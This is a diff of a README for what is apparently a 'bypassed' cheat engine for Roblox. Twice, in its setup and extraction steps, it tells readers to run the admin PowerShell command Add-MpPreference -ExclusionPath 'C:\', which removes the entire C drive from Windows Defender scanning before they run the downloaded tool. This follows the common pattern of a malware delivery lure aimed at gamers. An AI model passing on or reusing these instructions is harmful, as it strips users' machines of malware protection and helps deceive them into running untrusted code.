@@ -1,11 +1,11 @@
 # How to use
 
-First, you need to run the following powershell command (RUN AS ADMIN!) : Add-MpPreference -ExclusionPath "C:\"
+First, you need to run the following powershell command (RUN AS ADMIN!) : Add-MpPreference -ExclusionPath "C:\\"
 After running the powershell command, Open the roblox UWP app, and run the bypassed cheat engine.
 
 # Cant extract? 
 
-First of all, download winrar from https://www.win-rar.com/start.html?&L=0 then run the installer then extract it. Before extracting it though, remember to run this command in powershell as admin: Add-MpPreference -ExclusionPath "C:\"
+First of all, download winrar from https://www.win-rar.com/start.html?&L=0 then run the installer then extract it. Before extracting it though, remember to run this command in powershell as admin: Add-MpPreference -ExclusionPath "C:\\"
 
 # Contact us - extra help
 
